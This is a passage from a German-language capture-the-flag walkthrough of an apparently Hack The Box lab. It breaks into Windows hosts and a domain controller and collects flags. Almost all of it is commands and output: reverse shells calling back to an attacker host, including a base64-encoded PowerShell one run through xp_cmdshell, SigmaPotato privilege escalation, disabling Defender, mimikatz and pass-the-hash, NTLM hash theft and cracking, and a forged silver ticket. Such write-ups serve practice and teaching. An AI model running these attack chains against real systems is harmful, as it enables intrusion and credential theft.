    return x


model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit2.h5")
```

Versuchen wir die shell zu bekommen

```
cassandra@casino:~$ wget http://10.10.14.5/nc.exe
--2023-12-27 12:41:44--  http://10.10.14.5/nc.exe
Connecting to 10.10.14.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2332672 (2.2M) [application/x-msdos-program]
Saving to: ‘nc.exe’

nc.exe                       100%[==============================================>]   2.22M  1.63MB/s    in 1.4s    

2023-12-27 12:41:45 (1.63 MB/s) - ‘nc.exe’ saved [2332672/2332672]

cassandra@casino:~$ python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
10.0.52.111 - - [27/Dec/2023 12:42:39] "GET /nc.exe HTTP/1.1" 200 -


cassandra@casino:~$ ./ncat -lvnp 1337
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.0.52.111.
Ncat: Connection from 10.0.52.111:49739.

PS C:\Program Files> whoami
whoami
nt authority\local service

S C:\users\dev\Desktop> dir
dir


    Directory: C:\users\dev\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        11/6/2023   5:50 AM             29 flag.txt                                                              


PS C:\users\dev\Desktop> type flag.txt
type flag.txt
FHS{th3_l4mbd4_c4rr135_p0w3r}

```

Flag4 FHS{th3_l4mbd4_c4rr135_p0w3r}

Versuchen wir hier Admin zu werden

```
PS C:\Program Files\Python311> whoami /priv                                                                         
whoami /priv                                                                                                        
                                                                                                                    
PRIVILEGES INFORMATION                                                                                              
----------------------                                                                                              

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

```

https://itm4n.github.io/localservice-privileges/#the-task-scheduler-has-got-your-back

```
PS C:\Program Files\Python311> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `C:\\Windows\\Temp\\bumble.exe -e powershell 10.0.52.31 4444`""
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `C:\\Windows\\Temp\\bumble.exe -e powershell 10.0.52.31 4444`""
PS C:\Program Files\Python311> Register-ScheduledTask -Action $TaskAction -TaskName "SomeTaskB"
Register-ScheduledTask -Action $TaskAction -TaskName "SomeTaskB"

TaskPath                                       TaskName                          State     
--------                                       --------                          -----     
\                                              SomeTaskB                         Ready     


PS C:\Program Files\Python311> Start-ScheduledTask -TaskName "SomeTaskB"
Start-ScheduledTask -TaskName "SomeTaskB"
```

```
cassandra@casino:~$ ./ncat -lvnp 4444
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.52.111.
Ncat: Connection from 10.0.52.111:49768.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                        State   
============================= ================================== ========
SeAssignPrimaryTokenPrivilege Replace a process level token      Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
SeSystemtimePrivilege         Change the system time             Disabled
SeAuditPrivilege              Generate security audits           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
SeCreateGlobalPrivilege       Create global objects              Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled
SeTimeZonePrivilege           Change the time zone               Disabled

```

Das hast schon mal super funktioniert

```
PS C:\Windows\system32> [System.String[]]$Privs_new = "SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege", "SeImpersonatePrivilege"
[System.String[]]$Privs_new = "SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege", "SeImpersonatePrivilege"
PS C:\Windows\system32> $TaskPrincipal3 = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs_new
$TaskPrincipal3 = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs_new
PS C:\Windows\system32> $TaskAction3 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `C:\\Windows\\Temp\\bumble.exe -e powershell 10.0.52.31 4447`""
$TaskAction3 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `C:\\Windows\\Temp\\bumble.exe -e powershell 10.0.52.31 4447`""
PS C:\Windows\system32> Register-ScheduledTask -Action $TaskAction3 -TaskName "bumble7" -Principal $TaskPrincipal3
Register-ScheduledTask -Action $TaskAction3 -TaskName "bumble7" -Principal $TaskPrincipal3

TaskPath                                       TaskName                          State     
--------                                       --------                          -----     
\                                              bumble7                           Ready     


PS C:\Windows\system32> Start-ScheduledTask -TaskName "bumble7"
Start-ScheduledTask -TaskName "bumble7"
```

Ab zur neuen Shell

```
cassandra@casino:~$ ./ncat -lvnp 4447
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::4447
Ncat: Listening on 0.0.0.0:4447
Ncat: Connection from 10.0.52.111.
Ncat: Connection from 10.0.52.111:49769.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

Part 2 auch geschafft

Jetzt brauche ich Godpotato oder etwas was mir die AV Thematik abnimmt

https://github.com/tylerdotrar/SigmaPotato

```
$WebClient = New-Object System.Net.WebClient
PS C:\Windows\temp> $DownloadData = $WebClient.DownloadData("http://10.0.52.31:9001//SigmaPotato.exe")
$DownloadData = $WebClient.DownloadData("http://10.0.52.31:9001//SigmaPotato.exe")
PS C:\Windows\temp> [System.Reflection.Assembly]::Load($DownloadData)
[System.Reflection.Assembly]::Load($DownloadData)

GAC    Version        Location                                                                     
---    -------        --------                                                                     
False  v4.0.30319                                                                                  

PS C:\Windows\temp> $RevShell = @("--revshell", "10.0.52.31", "9001")
$RevShell = @("--revshell", "10.0.52.31", "9001")

PS C:\Windows\temp> [SigmaPotato]::Main($RevShell)
[SigmaPotato]::Main($RevShell)
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 948 | Token: 0x732 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 4000
[+] Current Command Length: 10 characters
---
[+] Creating a simple PowerShell reverse shell...
[+] IP Address: 10.0.52.31 | Port: 9001
[+] Bootstrapping to an environment variable...
[+] Payload base64 encoded and set to local environment variable: '$env:SigmaBootstrap'
[+] Environment block inherited local environment variables.
[+] New Command to Execute: 'powershell -c (powershell -e $env:SigmaBootstrap)'
[+] Setting 'CREATE_UNICODE_ENVIRONMENT' process flag.
---
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 3084

[+] Process Output:

```

springen wir zur neuen Shell

```
cassandra@casino:~$ ./ncat -lvnp 9001
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.0.52.111.
Ncat: Connection from 10.0.52.111:49785.
whoami
PS C:\Windows\temp> wnt authority\system

PS C:\users\administrator\Desktop> dir


    Directory: C:\users\administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        7/24/2023   6:57 AM       63607248 FileList.exe                                                          
-a----        11/6/2023   5:54 AM             30 flag.txt                                                              


PS C:\users\administrator\Desktop> type flag.txt
FHS{wh4t_w4s_l0st_1s_n0t_g0n3}

```

Flag 5 FHS{wh4t_w4s_l0st_1s_n0t_g0n3}

Versuchen wir mal creds zu dumpen

zuerst müssen wir die AV-Protection disablen

```
PS C:\Windows\Temp> Set-MpPreference -DisableRealtimeMonitoring $true
PS C:\Windows\Temp> New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Property
```

Jetzt mimikatz starten

```
mimikatz # lsadump::sam
Domain : VAULT
SysKey : ad7915b8e6d4f9ee383a5176349739e3
Local SID : S-1-5-21-4088429403-1159899800-2753317549

SAMKey : 49c22e412c9f412fa291a26d8b76f51e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7e18e03e6205be7ed1e4115fdc5b0fb8
```

Nun evil-winrm

```
┌──(bumble㉿bumble)-[/mnt/backup/HTB_Endgames/FullHouse]
└─$ evil-winrm -i 10.0.52.111 -u Administrator -H 7e18e03e6205be7ed1e4115fdc5b0fb8
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir

```

Da wir nun eine bessere shell haben versuchen wir die .exe Datei runterzuladen wo auch auf dem Desktop vom Administrator war.

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> download FileList.exe /mnt/backup/HTB_Endgames/FullHouse/FilList.exe
Info: Downloading C:\Users\Administrator\Desktop\FileList.exe to /mnt/backup/HTB_Endgames/FullHouse/FilList.exe
```

In der FileList.exe habe ich zugangsdaten für g.holmes gefunden. mit ilspy

![[Pasted image 20231229195851.png]]


```
┌──(bumble㉿bumble)-[/mnt/backup/HTB_Endgames/FullHouse]
└─$ smbclient -L //fullhouse.htb/ -U g.holme -p O7SRVdPPBYqJv   
Password for [WORKGROUP\g.holme]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Old Cobol Projects Disk      Group folder to share Cobol project for migration
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to fullhouse.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

Versuchen wir einen NLTM-STEAL

```
root@casino:/home/cassandra# ./smbserver_linux_x86_64 -smb2support share .

┌──(bumble㉿bumble)-[/mnt/backup/Linux-tools/ntlm_theft]
└─$ python3 ntlm_theft.py -g all -s 10.0.52.31 -f bumble

net use P: "\\10.0.52.2\Old Cobol Projects" /user:fullhouse.htb\g.holme O7SRVdPPBYqJv

*Evil-WinRM* PS C:\Windows\Temp\bumble> upload /home/bumble/Downloads/bumble/*

*Evil-WinRM* PS C:\Windows\Temp\bumble> copy * P:/
*Evil-WinRM* PS C:\Windows\Temp\bumble> dir P:/


    Directory: P:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/28/2023   6:41 AM             78 Autorun.inf
-a----        7/13/2023   3:45 AM           2138 BankInterface.cobol
-a----       12/28/2023   6:41 AM           5855 bumble-(externalcell).xlsx
-a----       12/28/2023   6:41 AM          10223 bumble-(frameset).docx
-a----       12/28/2023   6:41 AM          72584 bumble-(fulldocx).xml
-a----       12/28/2023   6:41 AM            107 bumble-(icon).url
-a----       12/28/2023   6:41 AM          10216 bumble-(includepicture).docx
-a----       12/28/2023   6:41 AM          26283 bumble-(remotetemplate).docx
-a----       12/28/2023   6:41 AM            162 bumble-(stylesheet).xml
-a----       12/28/2023   6:41 AM             55 bumble-(url).url
-a----       12/28/2023   6:41 AM           1649 bumble.application
-a----       12/28/2023   6:42 AM            146 bumble.asx
-a----       12/28/2023   6:42 AM             78 bumble.htm
-a----       12/28/2023   6:42 AM            191 bumble.jnlp
-a----       12/28/2023   6:42 AM           2164 bumble.lnk
-a----       12/28/2023   6:42 AM             48 bumble.m3u
-a----       12/28/2023   6:42 AM            769 bumble.pdf
-a----       12/28/2023   6:42 AM            102 bumble.rtf
-a----       12/28/2023   6:42 AM             84 bumble.scf
-a----       12/28/2023   6:42 AM             54 bumble.wax
-a----       12/28/2023   6:42 AM             46 desktop.ini

```

Ich bekomme hits

```
[*] Closing down connection (10.0.52.2,60369)
[*] Remaining connections []
[*] Incoming connection (10.0.52.2,60370)
[*] AUTHENTICATE_MESSAGE (fullhouse.htb\j.newell,DC)
[*] User DC\j.newell authenticated successfully
[*] j.newell::fullhouse.htb:aaaaaaaaaaaaaaaa:6b3d7d082f065745301af5427d33e019:010100000000000000e6312c9c39da01db5c647daf0730e10000000001001000430049005a006d004f00440064006f000200100067004800470050006d00590069004d0003001000430049005a006d004f00440064006f000400100067004800470050006d00590069004d000700080000e6312c9c39da010600040002000000080030003000000000000000000000000030000007ebaed5536a0663b705422b177d4741ff62c45fe96ddcfa67b3c25240ddd2030a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0030002e00350032002e00330031000000000000000000
[*] Closing down connection (10.0.52.2,60370)

```

Versuchen wir das zu cracken

```
┌──(bumble㉿bumble)-[/mnt/backup/HTB_Endgames/FullHouse]
└─$ hashcat -m 5600 hash /mnt/backup/rockyou.txt --show
J.NEWELL::fullhouse.htb:aaaaaaaaaaaaaaaa:6b3d7d082f065745301af5427d33e019:010100000000000000e6312c9c39da01db5c647daf0730e10000000001001000430049005a006d004f00440064006f000200100067004800470050006d00590069004d0003001000430049005a006d004f00440064006f000400100067004800470050006d00590069004d000700080000e6312c9c39da010600040002000000080030003000000000000000000000000030000007ebaed5536a0663b705422b177d4741ff62c45fe96ddcfa67b3c25240ddd2030a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0030002e00350032002e00330031000000000000000000:CasinoRoyale93

```

Passwort von User j.newell gefunden :CasinoRoyale93. Versuchen wir uns damit gleich zu verbinden

```
┌──(bumble㉿bumble)-[~]
└─$ evil-winrm -i 10.0.52.2 -u j.newell -p CasinoRoyale93
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\j.newell\Documents> cd ..
*Evil-WinRM* PS C:\Users\j.newell> cd Desktop
*Evil-WinRM* PS C:\Users\j.newell\Desktop> dir


    Directory: C:\Users\j.newell\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/6/2023   7:57 AM             27 flag.txt


*Evil-WinRM* PS C:\Users\j.newell\Desktop> type flag.txt
FHS{just_l1k3_th4t_r34lly?}

```

Flag 6 gefunden FHS{just_l1k3_th4t_r34lly?}

Ich finde eine interessante Localgroup 

```
*Evil-WinRM* PS C:\Windows\tasks> net localgroup

Aliases for \\DC

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*SQLServer2005SQLBrowserUser$DC
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

Es scheint das auf dem Server ein SQLServer installiert ist

```
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/13/2023   5:23 AM                Old Cobol Projects
d-----       10/10/2020   8:38 AM                PerfLogs
d-r---        7/10/2023   2:19 AM                Program Files
d-----        7/10/2023   2:16 AM                Program Files (x86)
d-----        7/10/2023   1:36 AM                SQL2022
d-r---        7/10/2023   2:22 AM                Users
d-----        12/3/2023   5:52 AM                Windows
```

Versuchen wir uns darauf zu connecten

```
Step 1

Upload chisel to 52.31 und starte server
cassandra@casino:/tmp/bumble$ wget http://10.10.14.5:8081/chisel

Step 2
Upload Chisel to 52.2 und starte client
*Evil-WinRM* PS C:\Users\j.newell\Documents> upload /home/bumble/Downloads/chisel.exe
*Evil-WinRM* PS C:\Users\j.newell\Documents> .\chisel client 10.0.52.31:9998 R:1433:127.0.0.1:1433
chisel.exe : 2023/12/29 05:35:43 client: Connecting to ws://10.0.52.31:9998
    + CategoryInfo          : NotSpecified: (2023/12/29 05:3...10.0.52.31:9998:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2023/12/29 05:35:43 client: Connected (Latency 4.2439ms)
cassandra@casino:/tmp/bumble$ ./chisel server -p 9998 --reverse
2023/12/29 13:34:21 server: Reverse tunnelling enabled
2023/12/29 13:34:21 server: Fingerprint /Hbv3sQFJtD7kvKNYLBw8XMYfC3AXAFFLjYOAVdQGQ0=
2023/12/29 13:34:21 server: Listening on http://0.0.0.0:9998
2023/12/29 13:35:43 server: session#1: Client version (1.9.1) differs from server version (1.7.7)
2023/12/29 13:35:43 server: session#1: tun: proxy#R:1433=>1433: Listening

```

Jetzt können wir uns von unserem kali darauf connecten

```
┌──(bumble㉿bumble)-[~]
└─$ sqsh -S 10.0.52.31:1433 -U 'FULLHOUSE\j.newell' -P 'CasinoRoyale93'
1> select @@version;
2> go

                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                

        ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------

        Microsoft SQL Server 2022 (RTM-GDR) (KB5029379) - 16.0.1105.1 (X64) 
        Aug 24 2023 02:40:55 
        Copyright (C) 2022 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)

```

Schauen wir ob wir xp_cmdshell nutzen können

```
1> SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
2> go -m pretty
+==================+==================================+==================================+==================================+==================================+==================================+==================================+============+=============+
| configuration_id | name                             | value                            | minimum                          | maximum                          | value_in_use                     | description                      | is_dynamic | is_advanced |
+==================+==================================+==================================+==================================+==================================+==================================+==================================+============+=============+
|            16390 | xp_cmdshell                      | 0                                | 0                                | 1                                | 0                                | Enable or disable command shell  |          1 |           1 |
+------------------+----------------------------------+----------------------------------+----------------------------------+----------------------------------+----------------------------------+----------------------------------+------------+-------------+

```

versuchen wir NLTM-hash zu bekommen wenn sich jemand darauf connected

```
cassandra@casino:/tmp/bumble$ su root
Password: 
root@casino:/tmp/bumble# ./smbserver_linux_x86_64 -smb2support share .
Cannot determine Impacket version. If running from source you should at least run "python setup.py egg_info"
Impacket v? - Copyright 2020 SecureAuth Corporation

------------------------------------------------------------
1> exec master.dbo.xp_dirtree '\\10.0.52.31\bumble';
2> go

        subdirectory                                                                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                
        depth      

        ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------
        -----------

(0 rows affected, return status = 0)



```

Ich erhalte im SmbServer tatsächlich einen neuen hash vom user r.smith

```
[*] AUTHENTICATE_MESSAGE (FULLHOUSE\r.smith,DC)
[*] User DC\r.smith authenticated successfully
[*] r.smith::FULLHOUSE:aaaaaaaaaaaaaaaa:93717ea784e06c60db92f32bf62afd48:01010000000000008008f8c35e3ada0195bc98a0880c4c3b00000000010010006c0072006d004f004d005a005400590002001000720046006f004c005300760071007100030010006c0072006d004f004d005a005400590004001000720046006f004c005300760071007100070008008008f8c35e3ada0106000400020000000800300030000000000000000000000000300000638d3bdc9a540a8b1e6ab9b5760f5a1e36127bb0fb5c91c767148ee1004cee050a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0030002e00350032002e00330031000000000000000000

```

Versuchen wir das zu cracken

```
┌──(bumble㉿bumble)-[/mnt/backup/HTB_Endgames/FullHouse]
└─$ hashcat -m 5600 hash2 /mnt/backup/rockyou.txt --show
R.SMITH::FULLHOUSE:aaaaaaaaaaaaaaaa:93717ea784e06c60db92f32bf62afd48:01010000000000008008f8c35e3ada0195bc98a0880c4c3b00000000010010006c0072006d004f004d005a005400590002001000720046006f004c005300760071007100030010006c0072006d004f004d005a005400590004001000720046006f004c005300760071007100070008008008f8c35e3ada0106000400020000000800300030000000000000000000000000300000638d3bdc9a540a8b1e6ab9b5760f5a1e36127bb0fb5c91c767148ee1004cee050a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0030002e00350032002e00330031000000000000000000:*abcd*zwm1314
```

da wir nun den Serviceaccount von MSSQL Server haben versuchen wir ein Silver Ticket zu erhalten

Step1 rpcclient für Domain-SID

```
┌──(bumble㉿bumble)-[~]
└─$ rpcclient -U "fullhouse.htb/j.newell" dc.fullhouse.htb
Password for [FULLHOUSE.HTB\j.newell]:
rpcclient $> lsaquerry
command not found: lsaquerry
rpcclient $> lsaquery
Domain Name: FULLHOUSE
Domain Sid: S-1-5-21-4088429403-1159899800-2753317549
```

Step2 aus dem password ein nthash machen

https://codebeautify.org/ntlm-hash-generator

![[Pasted image 20231229170033.png]]

Step3 Silver Ticket erstellen

```
python3 ticketer.py -nthash 1048894CFAD799F435B2F14452421B3D -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain fullhouse.htb -spn MSSQLSvc/dc.fullhouse.htb rsmith

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for fullhouse.htb/rsmith
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in rsmith.ccache


┌──(bumble㉿bumble)-[/mnt/backup/impacket/examples]
└─$ export KRB5CCNAME=rsmith.ccache 

┌──(bumble㉿bumble)-[/mnt/backup/impacket/examples]
└─$ klist
Ticketzwischenspeicher: FILE:rsmith.ccache
Standard-Principal: rsmith@FULLHOUSE.HTB

Valid starting       Expires              Service principal
29.12.2023 18:55:33  26.12.2033 18:55:33  MSSQLSvc/dc.fullhouse.htb@FULLHOUSE.HTB
        erneuern bis 26.12.2033 18:55:33

```

Versuchen wir nun mssqlclient

```
┌──(bumble㉿bumble)-[/mnt/backup/impacket/examples]
└─$ python3 mssqlclient.py dc.fullhouse.htb -k
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(dc\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(dc\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 481) 
[!] Press help for extra shell commands
SQL (FULLHOUSE\Administrator  dbo@master)> xp_cmdshell whoami
output              
-----------------   
fullhouse\r.smith   

NULL                

SQL (FULLHOUSE\Administrator  dbo@master)> xp_cmdshell whoami /priv
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeMachineAccountPrivilege     Add workstations to domain                Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

N
```

Ich habe die selben Rechte wie für flag 5, versuchen wir es genauso

Erstmal besorgen wir uns eine shell

```
SQL (FULLHOUSE\Administrator  dbo@master)> xp_cmdshell powershell curl 10.0.52.31/nc.exe -outfile C:\\Windows\\Temp\\nc.exe

SQL (FULLHOUSE\Administrator  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADUAMgAuADMAMQAiACwAOQAwADAAMgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

```

Jetzt noch ncat starten

```
cassandra@casino:/tmp/bumble$ ./ncat -lvnp 9002
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
Ncat: Connection from 10.0.52.2.
Ncat: Connection from 10.0.52.2:60662.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> xp_cmdshell powershell $WebClient = New-Object System.Net.WebClient
xp_cmdshell powershell $WebClient = New-Object System.Net.WebClient
PS C:\Windows\system32> $WebClient = New-Object System.Net.WebClient
$WebClient = New-Object System.Net.WebClient
PS C:\Windows\system32> $DownloadData = $WebClient.DownloadData("http://10.0.52.31:8081/SigmaPotato.exe")
$DownloadData = $WebClient.DownloadData("http://10.0.52.31:8081/SigmaPotato.exe")
PS C:\Windows\system32> [System.Reflection.Assembly]::Load($DownloadData)
[System.Reflection.Assembly]::Load($DownloadData)

GAC    Version        Location                                                                                         
---    -------        --------                                                                                         
False  v4.0.30319                                                                                                      


PS C:\Windows\system32> $RevShell = @("--revshell", "10.0.52.31", "9003")
$RevShell = @("--revshell", "10.0.52.31", "9003")
PS C:\Windows\system32> [SigmaPotato]::Main($RevShell)
[SigmaPotato]::Main($RevShell)
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 908 | Token: 0x812 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 2332
